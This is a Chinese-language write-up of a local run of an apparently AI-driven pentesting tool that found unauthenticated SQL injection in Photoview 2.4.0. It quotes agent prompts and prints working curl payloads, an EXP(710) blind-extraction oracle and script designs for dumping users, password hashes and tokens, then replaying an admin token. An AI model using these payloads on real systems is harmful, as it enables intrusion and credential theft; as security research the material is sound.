# Shannon 在 Photoview 2.4 中发现 INJ-01 的过程复盘

本文整理的是本地 Shannon 运行记录，不是对外部系统的风险处置说明。目标是复现和理解开源项目 Shannon 的工作流：`deepseek-v4.1-flash` 这次在 Photoview 2.4.0 上如何从预侦察、侦察、专项分析一路推进到注入漏洞 PoC。

## 0. 这次运行是哪一次

- 运行目录：`workspaces/host-docker-internal_shannon-1790063197135/`
- 目标：`http://host.docker.internal:4800`
- 扫描时间：`2026-09-22T07:46:39.722Z` 到 `2026-09-22T13:04:43.878Z`
- 模型：`ep-20260921205410-m6s4d`
- 模型配置：`models.volcengine.json` 中 Volcengine Ark provider 的自定义模型项
- 本地说明：`启动文档.md` 记录为 `deepseek-v4.1-flash在photoview2.4运行情况`，共挖出 16 个漏洞，其中注入 1 个
- 最终注入漏洞：`INJ-01: Unauthenticated SQL Injection in Album Download album_id`

关键证据文件：

| 类型 | 文件 |
|---|---|
| 总报告 | `workspaces/host-docker-internal_shannon-1790063197135/Security-Assessment-Report.md` |
| 复现步骤 | `workspaces/host-docker-internal_shannon-1790063197135/PHOTOVIEW-2.4-复现步骤.md` |
| 运行元数据 | `workspaces/host-docker-internal_shannon-1790063197135/.shannon/session.json` |
| pre-recon 日志 | `workspaces/host-docker-internal_shannon-1790063197135/.shannon/agents/pre-recon.log` |
| recon 日志 | `workspaces/host-docker-internal_shannon-1790063197135/.shannon/agents/recon.log` |
| injection-vuln 日志 | `workspaces/host-docker-internal_shannon-1790063197135/.shannon/agents/injection-vuln.log` |
| injection-exploit 日志 | `workspaces/host-docker-internal_shannon-1790063197135/.shannon/agents/injection-exploit.log` |
| 阶段产物 | `workspaces/host-docker-internal_shannon-1790063197135/.shannon/deliverables/` |
| PoC 脚本 | `workspaces/host-docker-internal_shannon-1790063197135/.shannon/scratchpad/blind_sqli.py`、`blind_dump.py` |

一个重要细节：Shannon 没有把四个顶层 agent 的“完全展开后最终 prompt”单独保存成文件。可复原来源是：

1. `apps/worker/src/session-manager.ts`：记录每个 agent 使用哪个 prompt 模板。
2. `apps/worker/src/services/prompt-manager.ts`：运行时读取模板、处理 `@include(...)`、插入变量。
3. `apps/worker/prompts/*.txt`：实际模板。
4. `.shannon/agents/*.log`：模型执行时真实派发的子任务 prompt、工具调用和提交结果。

所以本文里的“提示词”分两层：顶层 agent 的 prompt 来自模板和 include；子 agent 的 prompt 直接来自日志，是当次运行中真实下发的文本。

## 1. Shannon 的 agent 映射

`apps/worker/src/session-manager.ts` 中这四个阶段的映射是：

| 阶段 | 模板 | 输出文件 |
|---|---|---|
| `pre-recon` | `apps/worker/prompts/pre-recon-code.txt` | `.shannon/deliverables/pre_recon_deliverable.md` |
| `recon` | `apps/worker/prompts/recon.txt` | `.shannon/deliverables/recon_deliverable.md` |
| `injection-vuln` | `apps/worker/prompts/vuln-injection.txt` | `.shannon/deliverables/injection_analysis_deliverable.md`，另提交 `injection_exploitation_queue.json` |
| `injection-exploit` | `apps/worker/prompts/exploit-injection.txt` | `.shannon/deliverables/injection_exploitation_evidence.md` |

prompt loader 会把共享片段插进去。例如：

- `shared/_target.txt` 给出 `WEB_URL`、源码路径、deliverables、scratchpad。
- `shared/_shared-session.txt` 告诉 agent 复用预登录浏览器会话。
- `shared/_vuln-scope.txt` 要求只报告能通过目标 URL 从外部访问面触发的问题。
- `shared/exploitation/_exploit-scope.txt` 要求 exploitation 只打 `{{WEB_URL}}`，不能用数据库控制台或直接服务器访问制造条件。
- `shared/exploitation/_credentials-in-findings.txt` 要求报告里不要提交扫描配置中的原始账号密码。

## 2. pre-recon 阶段

### 2.1 顶层 prompt 是什么

模板：`apps/worker/prompts/pre-recon-code.txt`

核心角色设定：

```text
Role: You are a Principal Engineer specializing in rapid, security-focused code review.
Objective: analyze the provided source code to generate a security-relevant architectural summary AND a list of the most critical files for manual review.
```

pre-recon 的关键要求：

- 它是第一个 AI agent，输入只有目标源码。
- 它的输出是 `.shannon/deliverables/pre_recon_deliverable.md`，会喂给后续所有阶段。
- 它被告知自己是“ONLY agent in the workflow with complete source code access”。
- 它必须覆盖架构、认证授权、数据安全、攻击面、关键路径、XSS sinks、SSRF sinks。
- 它必须使用 task agent 做源码分析，直接读源码被模板禁止。
- 它必须按阶段派发 6 个子 agent：
  - Architecture Scanner
  - Entry Point Mapper
  - Security Pattern Hunter
  - XSS/Injection Sink Hunter
  - SSRF/External Request Tracer
  - Data Security Auditor

模板中提供给它的信息：

- `REPO_PATH=/repos/repo`
- deliverables 和 scratchpad 可写路径
- 下游会分析的类别：Injection、XSS、Authentication、Authorization、SSRF
- 代码路径规则
- 网络可达范围规则
- 要调用的 7 个 deliverable tools

### 2.2 当次运行中实际派发了哪些子任务

日志 `pre-recon.log` 显示，`2026-09-22 07:47:50` 先创建 todo，然后 `07:48:38` 并行启动三类 discovery 子任务。

#### Architecture Scanner 的实际 prompt 摘要

日志里下发的 prompt 明确指定 Photoview 2.4.0，源码 `/repos/repo`，并要求：

- 识别 Go 后端、GraphQL/gqlgen、GORM、React/Apollo/Vite 等版本。
- 判断是否是 API 和 SPA 混合单体。
- 找认证中间件、授权指令、session、token、CSRF、CORS、安全头、速率限制。
- 重点看媒体服务路径：`api/routes/photos.go`、`downloads.go`、`videos.go`、`api/scanner/`。
- 检查数据库驱动、迁移、raw SQL。
- 检查 Docker、systemd、环境变量。
- 检查 background scanner。

这一步读到了 `api/routes/downloads.go`，也搜索了 `Raw(`、`Exec(`、`FormatSQL`、`Order(`、`order_by` 等 SQL 相关模式。

#### Entry Point Mapper 的实际 prompt 摘要

它被要求枚举所有网络可达入口：

- 完整读取 `api/graphql/schema.graphql`。
- 枚举 Query、Mutation、Subscription。
- 读取 `api/routes/*.go`，区分 public 和 authenticated。
- 特别关注认证路由、媒体路由、下载路由、WebSocket、静态文件服务。

这一步也读到了 `api/routes/downloads.go`。因此 `GET /api/download/album/{album_id}/{media_purpose}` 在最早阶段已经进入攻击面目录。

#### Security Pattern Hunter 的实际 prompt 摘要

它被要求映射安全架构：

- 认证端点和逻辑：login、logout、initial setup、token refresh 等。
- token 创建和校验。
- cookie flag。
- GraphQL directive。
- album ownership、share token access model。
- 密码哈希、CORS、CSRF、安全头、rate limit。

这一步同样读取了 `api/routes/downloads.go`，因为下载路由的 `authenticateAlbum` 是授权模型的一部分。

#### XSS/Injection Sink Hunter 的实际 prompt 摘要

这是 pre-recon 中和 INJ-01 最相关的子任务。它的 prompt 明确要求：

```text
Part B — Injection sinks (backend api/)
- SQL injection: find raw SQL / string concatenation into queries.
  CRITICAL: examine api/graphql/models/utils.go FormatSQL function and how Ordering.order_by user input flows into GORM clause.OrderByColumn.
  Also check all db.Raw, db.Exec, Where with fmt.Sprintf, and recursive CTEs.
- Command injection: find os/exec usage.
- Path traversal / file inclusion: examine api/routes/photos.go, videos.go, downloads.go, spa.go.
- Log injection / header injection: Content-Disposition built from album.Title in downloads.go.
```

这个 prompt 重点先点名了 `Ordering.order_by`，但也把 `downloads.go` 放进 path traversal / file inclusion 和下载逻辑检查里。也就是说，pre-recon 阶段提供的是“入口和 sink 候选”，还没有最终判定 INJ-01。

### 2.3 pre-recon 提供了哪些和 INJ-01 相关的信息

pre-recon 的产物把 Photoview 描述为：

- Go 后端 + gqlgen GraphQL + gorilla/mux REST routes。
- GORM 数据访问层。
- 媒体字节入口包括 `/api/photo/{name}`、`/api/video/{name}`、`/api/download/album/{album_id}/{media_purpose}`。
- MySQL/MariaDB 默认路径下启用 `MultiStatements=true`。
- REST 下载路由是后续需要重点分析的文件。

它更像是“把地图画出来”。真正把 `album_id` 和 GORM raw condition 绑定起来，是 recon 和 injection-vuln 阶段完成的。

## 3. recon 阶段

### 3.1 顶层 prompt 是什么

模板：`apps/worker/prompts/recon.txt`

核心角色设定：

```text
You are a world-class Reconnaissance Analyst and Attack Surface Mapper.
Your mission is to conduct a thorough white-box analysis of the target application by correlating live application behavior with the full source code.
You are NOT looking for vulnerabilities yet.
```

recon 的启动上下文：

- 必须先读 `.shannon/deliverables/pre_recon_deliverable.md`。
- 目标 URL 是 `http://host.docker.internal:4800`。
- 源码在 `/repos/repo`。
- 必须恢复共享登录状态。
- 要用浏览器探索 live application。
- 要把浏览器观察和源码实现对应起来。

它的系统化方法：

1. 读完整 pre-recon deliverable。
2. 使用 Playwright 探索目标站点。
3. 并行启动 task agent：
   - Route Mapper
   - Authorization Checker
   - Input Validator
   - Session Handler
4. 再启动 Authorization Architecture Agent。
5. 再启动 Injection Source Tracer。
6. 用 deliverable tools 输出 endpoint、input vector、network map、role architecture、authz candidates、injection sources。

### 3.2 recon 中和注入有关的实际 prompt

`recon.log` 中 `2026-09-22 09:01:43` 派发了 Input Validator：

```text
enumerate all network-controllable INPUT VECTORS
KEY FILES:
- api/graphql/schema.graphql
- api/graphql/models/utils.go
- api/routes/authenticate_routes.go
- api/routes/photos.go, videos.go, downloads.go
...
1. URL/query parameters: list every REST path/query parameter (photo name, video name, album_id, purpose, token, etc.) with validation and file:line.
```

同一个阶段还派发了 Injection Source Tracer。模板要求它：

```text
Find all injection sources in the codebase: SQL injection, command injection, file inclusion/path traversal, SSTI, and insecure deserialization.
Trace user-controllable input from network-accessible endpoints to dangerous sinks.
For each source found, provide the complete data flow path from input to dangerous sink with exact file paths and line numbers.
```

### 3.3 recon 提供了哪些和 INJ-01 相关的信息

`recon_deliverable.md` 已经把漏洞轮廓写得很清楚：

- endpoint 表中：

```text
GET /api/download/album/{album_id}/{media_purpose}
required_role: anon
authorization: authenticateAlbum, but album lookup runs BEFORE auth
description: album_id is passed raw to db.Find (unauthenticated SQL injection)
```

- input vector 中：

```text
album_id @ api/routes/downloads.go:20 - NOT parsed as integer; passed raw to db.Find (GORM raw-SQL condition) -> unauthenticated SQL injection
media_purpose @ api/routes/downloads.go:22 - comma-split (max 10), no allowlist, bound in IN (?)
```

- injection sources 中：

```text
db.Find(&album, albumID) at api/routes/downloads.go:20 -> :25
GORM BuildCondition emits clause.Expr raw SQL for a non-numeric string.
Runs BEFORE authenticateAlbum, so it is reachable unauthenticated.
Live-verified: '1 OR 1=1' returns 403 while 'abc' returns 404.
MySQL MultiStatements=true amplifies impact.
```

这里的关键是：recon 阶段不仅发现了源码路径，还把 live 行为 `abc => 404`、`1 OR 1=1 => 403` 写进了 deliverable。后面的 injection-vuln 阶段依赖这份结果，但按自己的边界不再执行攻击。

## 4. injection-vuln 阶段

### 4.1 顶层 prompt 是什么

模板：`apps/worker/prompts/vuln-injection.txt`

核心角色设定：

```text
You are an Injection Analysis Specialist, an expert in white-box code analysis and data flow tracing for SQLi, Command Injection, LFI/RFI, SSTI, Path Traversal, and Deserialization vulnerabilities.
```

目标：

```text
Identify where untrusted input reaches dangerous sinks without proper defenses.
Success criterion: Complete source-to-sink traces detailing path, sanitizers, sink context, and vulnerability reason with a minimal proof-of-concept payload.
```

边界：

- 它只做分析，不做 exploitation。
- 它的单一结构来源是 `.shannon/deliverables/recon_deliverable.md`。
- 它需要把每个 injection source 做 source-to-sink 追踪。
- 它要判断 slot type、sanitization、concat、mismatch reason。
- 它要把可外部利用的项提交到 `injection_exploitation_queue.json`。

模板给它的 witness examples 包括：

```text
SQLi:
Error shape checkers: ' " ) ; \
Boolean toggles: ... AND 1=1 vs ... AND 1=2
Timing toggles: ... AND SLEEP(5)
UNION probes: ... UNION SELECT NULL ...
Comment terminators: -- # /**/
```

注意这些是“给 exploit phase 使用的 witness payload”，模板明确说分析阶段不执行。

### 4.2 这个 agent 实际如何分析 INJ-01

`injection-vuln.log` 中它先创建 todo：

```text
Analyze SQLi: album_id raw into GORM Find (downloads.go)
Analyze SQL identifier injection: Ordering.order_by -> clause.OrderByColumn
Analyze SQLi in media_purpose IN clause and pagination limit/offset
Analyze search query LIKE wildcard handling
Analyze command injection in media processors/scanner
Analyze path traversal/LFI ...
Analyze SSTI and deserialization
```

随后它给子 agent 下发了专门任务：`Trace SQLi album_id download route`。这是当次运行中最关键的一段 prompt：

```text
TARGET: GET /api/download/album/{album_id}/{media_purpose} handler in /repos/repo/api/routes/downloads.go.

Tasks:
1. Read api/routes/downloads.go fully. Show how albumID is obtained (mux.Vars) and how it is passed to GORM at line ~25 db.Find(&album, albumID).
   Determine whether albumID is parsed/validated/cast to an integer anywhere before the Find.
   Explain how GORM BuildCondition handles a non-numeric string passed as the second arg to Find
   (it emits a raw clause.Expr WHERE condition).
   Confirm whether this is classic SQL injection.
2. Determine whether authentication/authorization (authenticateAlbum) runs BEFORE or AFTER the db.Find.
3. Read api/routes/authenticate_routes.go ... whether the response can act as a blind/error oracle (404 on SQL error vs 403 on row matched).
4. Trace media_purpose ... passed as a bound parameter in the IN (?) clause?
5. Also check if there is any other route or resolver that passes an unvalidated string to db.Find(&x, value) or db.First(&x, value).

Report each distinct path with:
source, path, sink_call, slot_type, sanitization_observed, concat_occurrences,
verdict, mismatch_reason, witness_payload, confidence, notes.

Do NOT execute any attacks.
```

这个 prompt 提供的信息非常多，已经带着 recon 阶段筛出的 hypothesis：

- 目标 handler。
- 可疑 sink：`db.Find(&album, albumID)`。
- 要验证的 GORM 行为：non-numeric string + no extra args -> raw `clause.Expr`。
- 要验证的认证顺序：`Find` 是否在 `authenticateAlbum` 前。
- 要验证的 oracle：SQL error => 404，row matched => 403。
- 要同时确认 `media_purpose` 是否安全。

### 4.3 injection-vuln 的输出

`injection_analysis_deliverable.md` 中，agent 给出两个注入类候选：

1. 高置信度：album download route 的 unauthenticated SQL injection。
2. 较低影响：GraphQL `Ordering.order_by` 的 identifier/ordering oracle。

对 INJ-01 的判断：

```text
The album-download handler reads album_id from the URL as a raw string and passes it as GORM's second argument to db.Find(&album, albumID).
GORM treats any non-numeric string with no extra args as a raw clause.Expr.
No integer parsing, cast, or allowlist is applied, and authentication runs only after the query.
```

它还给 exploitation phase 提供战略信息：

- 没有 WAF、没有反代过滤、没有 rate limiter。
- REST route 不返回 verbose DB error。
- 可用 404 vs 403 做 blind boolean/error oracle。
- 代码默认 MySQL/MariaDB，`api/database/database.go:33` 中 `MultiStatements=true`。
- live DB 引擎在分析阶段还没有最终确认，所以 exploitation 要先 fingerprint。

日志中的 `submit_exploitation_queue` 工具调用先以 `INJ-VULN-01` 提交；落盘后的 `injection_exploitation_queue.json` 被规范化为最终漏洞 ID `INJ-01`：

```json
{
  "ID": "INJ-01",
  "vulnerability_type": "SQLi",
  "externally_exploitable": true,
  "confidence": "high",
  "source": "album_id URL path parameter @ api/routes/downloads.go:20",
  "path": "GET /api/download/album/{album_id}/{media_purpose} -> ... -> db.Find(&album, albumID) (:25) -> GORM Statement.BuildCondition -> clause.Expr{SQL: albumID, Vars: nil}",
  "slot_type": "SQL-raw-clause",
  "sanitization_observed": "None",
  "verdict": "vulnerable",
  "witness_payload": "1 OR 1=1 ... 'abc' -> HTTP 404 vs '1 OR 1=1' -> HTTP 403"
}
```

这就是 exploitation agent 后续的主要输入。

## 5. injection-exploit 阶段

### 5.1 顶层 prompt 是什么

模板：`apps/worker/prompts/exploit-injection.txt`

核心角色设定：

```text
You are a world-class Injection Exploitation Specialist.
You are not an analyst; you are an active penetration tester.
Your persona is methodical, persistent, and laser-focused on proving tangible impact.
```

目标：

```text
systematically and exhaustively weaponize every single potential SQL Injection and Command Injection vulnerability
For each vulnerability, confirm exploitability and achieve data exfiltration for SQLi, or prove it is not exploitable.
```

启动时必须读取：

1. `.shannon/deliverables/injection_exploitation_queue.json`
2. `.shannon/deliverables/pre_recon_deliverable.md`
3. `.shannon/deliverables/recon_deliverable.md`
4. `.shannon/deliverables/injection_analysis_deliverable.md`

它的 exploitation 方法被写成四步：

1. Confirmation & Probing
2. Fingerprinting & Enumeration
3. Targeted Exfiltration
4. 最终 verdict 和 `add_exploit`

它被要求：

- 每个漏洞至少做多种 payload 尝试。
- 一旦确认 SQLi，要提取 DB version、current user、table names、敏感表前 5 行。
- Level 3（真实数据提取）才算 demonstrated impact。
- 自定义脚本、payload loop、枚举 workflow 要委托给 `task` agent。
- 最终用 `add_exploit` 提交证据。

### 5.2 exploit agent 一开始拿到了哪些信息

`injection-exploit.log` 显示：

- `12:33:37` 读取 `injection_exploitation_queue.json`。
- `12:33:49` 读取 `injection_analysis_deliverable.md`。
- `12:34:02` 读取 `api/routes/downloads.go` 和 `api/graphql/models/utils.go`。
- 同时读取 `api/server.go` 和 `api/database/database.go`，确认路由注册和数据库配置。
- `12:34:20` 创建 todo：
  - `INJ-01: Exploit unauthenticated SQLi in GET /api/download/album/{album_id}/{media_purpose}`
  - `INJ-02: Exploit GraphQL Ordering.order_by identifier/ordering injection`
  - `Record final verdicts`

### 5.3 PoC 是怎么一步步生成的

#### 第一步：状态码确认

exploit agent 先用 curl 做最小确认：

```bash
curl ... /api/download/album/1/original
curl ... /api/download/album/abc/original
curl ... /api/download/album/1%20OR%201=1/original
curl ... /api/download/album/1%20AND%201=2/original
```

它观察的核心差异是：

- `abc`：SQL 语法/执行错误，handler 映射为 HTTP 404。
- `1 OR 1=1`：SQL 语句有效，能进入后续 auth，匿名用户被拒绝，HTTP 403。

这一步把 recon 的 live verification 重新确认了一遍。

#### 第二步：尝试不同 SQL 方言和 oracle 形式

它继续尝试：

```text
1 AND sleep(0)
1 AND sleep(3)
1 AND pg_sleep(0)
1 AND version()
1 AND sqlite_version()
1 AND (1=1)
1 AND (1=2)
1 AND database()
1 AND user()
```

目的：

- 判断是不是 MySQL/MariaDB、Postgres 或 SQLite。
- 看时间型 payload 是否有效。
- 看函数调用是否能作为条件表达式进入查询。

然后尝试条件错误形式：

```text
1 AND (SELECT IF(1=1,1,(SELECT 1 UNION SELECT 2)))
1 AND (SELECT IF(1=2,1,(SELECT 1 UNION SELECT 2)))
1 AND (SELECT CASE WHEN 1=1 THEN 1 ELSE (SELECT 1 UNION SELECT 2) END)
1 AND (SELECT CASE WHEN 1=2 THEN 1 ELSE (SELECT 1 UNION SELECT 2) END)
```

这里的想法是：让 false 分支制造“子查询返回多行”错误，从而把 true/false 变成 403/404 的状态码差异。

#### 第三步：把条件错误 oracle 交给脚本子 agent

`12:36:07`，exploit agent 派发了 `Blind SQLi data extraction INJ-01` 子任务。实际 prompt 要求：

```text
Role: security testing script writer.
Write & run a Python 3 script (stdlib only, urllib) that performs blind error-based SQL injection data extraction.

Target: http://host.docker.internal:4800/api/download/album/<PAYLOAD>/original
Injection payload template:
  1 AND (SELECT IF((CONDITION),1,(SELECT 1 UNION SELECT 2)))
Oracle:
  HTTP 403 => CONDITION TRUE
  HTTP 404 => CONDITION FALSE
DB is MySQL/MariaDB.

Implement helpers:
  q(cond) returns bool
  extract_scalar(expr) extracts a string:
    - length via binary search on LENGTH(expr)
    - each char via binary search on ASCII(SUBSTRING(expr,i,1))
  extract_list(expr, n) for comma-separated values

Extract and print as JSON:
1. database(), version(), current_user()
2. all table names
3. column names of users
4. first 5 users rows
5. columns and first 5 rows of share_tokens and access_tokens if present

Save final JSON to /repos/repo/.shannon/scratchpad/inj01_extraction.json.
```

这个 prompt 已经是一个完整的 PoC 生成规格：

- 目标 URL 模板。
- payload 模板。
- oracle 映射。
- 提取算法。
- 输出数据结构。
- 结果保存路径。

#### 第四步：脚本实现一版，然后演化出更稳的 EXP(710) oracle

日志中的第一版脚本是 `inj01_extract.py`，使用的模板是：

```python
PAYLOAD_TMPL = "1 AND (SELECT IF(({cond}),1,(SELECT 1 UNION SELECT 2)))"
```

后续留下的主要脚本是 `blind_sqli.py`。它把 oracle 改成：

```python
payload = f"1 AND IF({cond}, EXP(710), 1)"
```

脚本注释写得很直接：

```text
HTTP 404 => <COND> is TRUE   (EXP overflow -> SQL error)
HTTP 403 => <COND> is FALSE  (valid SQL)
```

为什么 `EXP(710)` 更稳：

- MariaDB 中 `EXP(710)` 会触发 out-of-range 错误。
- `IF(condition, EXP(710), 1)` 使 TRUE 分支必然 SQL error -> 404。
- FALSE 分支返回 `1`，SQL 有效 -> 403。
- 它比 `UNION SELECT` 多行错误更短，也更适合作为字符提取中的高频请求 payload。

`blind_sqli.py` 实现了：

- `_request(payload)`：构造 GET 请求。
- `check(cond)`：把 HTTP 404 映射为 True，403 映射为 False。
- `find_length(expr)`：二分搜索字符串长度。
- `char_at_binary(expr, i)`：二分搜索第 i 个字符的 ASCII。
- `extract_str_binary(expr)`：并发提取所有字符。
- 主流程提取：
  - `version()`
  - `user()`
  - `database()`
  - table count
  - table names

`blind_dump.py` 在此基础上继续做数据 dump：

- 复用 `blind_sqli.check` 和 `extract_str`。
- 枚举 `users`、`access_tokens`、`share_tokens`、`albums` 的列。
- 统计行数。
- 提取 users 的 `username/admin/password`。
- 提取 access_tokens 的 `value/user_id/expire`。
- 提取 share_tokens 的 `value/album_id/media_id`。
- 用 `HEX(CAST(... AS CHAR))` 做一次校验，避免 `/`、`$`、quote 等字符破坏 URL path。

#### 第五步：形成最终报告中的 PoC

最终 `add_exploit` 里的 PoC 被整理为 7 步：

1. 确认注入：

```bash
curl -s -o /dev/null -w "%{http_code}\n" \
  'http://host.docker.internal:4800/api/download/album/abc/original'

curl -s -o /dev/null -w "%{http_code}\n" \
  'http://host.docker.internal:4800/api/download/album/1%20OR%201=1/original'
```

2. 建立条件错误盲注 oracle：

```bash
curl -s -o /dev/null -w "%{http_code}\n" \
  'http://host.docker.internal:4800/api/download/album/1%20AND%20IF(1=1,EXP(710),1)/original'

curl -s -o /dev/null -w "%{http_code}\n" \
  'http://host.docker.internal:4800/api/download/album/1%20AND%20IF(1=2,EXP(710),1)/original'
```

3. 用 `IF(ASCII(SUBSTRING((expr),i,1))=c, EXP(710), 1)` 字符级提取 DB fingerprint。

4. 通过 `information_schema.tables` 和 `information_schema.columns` 枚举 schema。

5. 用相同 oracle 提取高价值表的样本。

6. 用提取到的管理员 access token 作为 `auth-token` cookie 调用 GraphQL，确认 admin session。

7. 用 stacked statement 探针确认 `MultiStatements=true`：

```bash
curl -s -o /dev/null -w "%{http_code}\n" \
  'http://host.docker.internal:4800/api/download/album/1%3BSELECT%201/original'

curl -s -o /dev/null -w "%{http_code}\n" \
  'http://host.docker.internal:4800/api/download/album/1%3BSELECT%20*%20FROM%20nonexistent_tbl_zzz/original'
```

本文不重新抄完整 token 清单；原始 evidence 在 `injection_exploitation_evidence.md` 和总报告中。过程理解的重点是：exploit agent 先从状态码差异确认可控 SQL 结构，再选择稳定的 MariaDB 条件错误函数，把 HTTP 状态码变成布尔信道，最后用二分搜索自动化提取。

## 6. INJ-02 为什么没有成为最终注入漏洞

分析阶段把 `Ordering.order_by` 也放进了 exploitation queue，ID 是 `INJ-02`。exploit agent 后续实际测试：

- `id`
- `no_such_column_zzz`
- `id")--`
- `id; SELECT SLEEP(3)`
- `id--`
- `(SELECT 1)`
- 反引号、换行、null byte、`USING` 等变体

结果都被 GORM 当成一个 quoted identifier，无法 breakout 成 SQL 表达式或 stacked statement。agent 最终写入：

```text
workspace/injection_false_positives.md
Verdict: FALSE POSITIVE (not SQL injection)
```

这解释了为什么最终报告的注入漏洞只有一个：`INJ-01`。

## 7. 从 Shannon 工作流角度看，这个漏洞是怎样被发现的

可以把过程压缩成这条链：

```text
pre-recon
  -> 识别 Photoview 架构、REST 下载路由、GORM、MySQL MultiStatements、媒体 route

recon
  -> 把 /api/download/album/{album_id}/{media_purpose} 列为 anon endpoint
  -> 把 album_id 标为 input vector
  -> 通过源码和 live 行为写下：album_id raw -> db.Find，abc=404，1 OR 1=1=403

injection-vuln
  -> 专门追踪 album_id source-to-sink
  -> 验证 db.Find(&album, albumID) 在 authenticateAlbum 前
  -> 验证无 strconv.Atoi / allowlist / parameterized id = ?
  -> 用 GORM BuildCondition 行为解释为什么 non-numeric string 变 raw WHERE clause
  -> 生成 INJ-01 exploitation queue

injection-exploit
  -> 读取 queue 和分析产物
  -> curl 确认 404/403 oracle
  -> 尝试 DB dialect 和条件错误 payload
  -> 让脚本子 agent 生成 blind extractor
  -> 演化为 EXP(710) 条件错误 oracle
  -> 提取 DB fingerprint/schema/sample data
  -> 用提取 token 验证 admin takeover
  -> add_exploit 提交 INJ-01
```

## 8. 这个过程体现出的 Shannon 特点

1. pre-recon 不是直接“找漏洞”，而是建立后续 agent 会继承的源码情报层。它的 prompt 强调完整架构、入口、关键路径。

2. recon 把白盒代码和 live 行为接起来。INJ-01 的 404/403 差异第一次明确出现在 recon deliverable，而不是最终 exploit 阶段才发现。

3. injection-vuln 的工作是“判定结构性缺陷”，它严格避免 live exploitation，但会生成 witness payload 和 exploitation queue。

4. exploit agent 的 prompt 让它必须从 queue 出发，逐项得出 exploited / blocked / false positive。`INJ-02` 被它降为 false positive，这说明 exploitation 阶段不只是把分析结果照抄进报告。

5. PoC 不是单个 payload，而是逐层构造出来的：
   - 状态码差异
   - 条件错误 oracle
   - 字符级提取 primitive
   - schema enumeration
   - high-value table extraction
   - token replay impact
   - stacked statement impact

## 9. 复现时最小需要看的文件

如果只想复现 Shannon 发现这个注入漏洞的过程，按这个顺序读：

1. `apps/worker/prompts/pre-recon-code.txt`
2. `workspaces/host-docker-internal_shannon-1790063197135/.shannon/agents/pre-recon.log`
3. `apps/worker/prompts/recon.txt`
4. `workspaces/host-docker-internal_shannon-1790063197135/.shannon/deliverables/recon_deliverable.md`
5. `apps/worker/prompts/vuln-injection.txt`
6. `workspaces/host-docker-internal_shannon-1790063197135/.shannon/agents/injection-vuln.log`
7. `workspaces/host-docker-internal_shannon-1790063197135/.shannon/deliverables/injection_exploitation_queue.json`
8. `apps/worker/prompts/exploit-injection.txt`
9. `workspaces/host-docker-internal_shannon-1790063197135/.shannon/agents/injection-exploit.log`
10. `workspaces/host-docker-internal_shannon-1790063197135/.shannon/scratchpad/blind_sqli.py`
11. `workspaces/host-docker-internal_shannon-1790063197135/.shannon/scratchpad/blind_dump.py`
12. `workspaces/host-docker-internal_shannon-1790063197135/.shannon/deliverables/injection_exploitation_evidence.md`

这 12 个文件基本覆盖了从 prompt 到 agent 行为、从分析队列到 PoC 的完整链路。
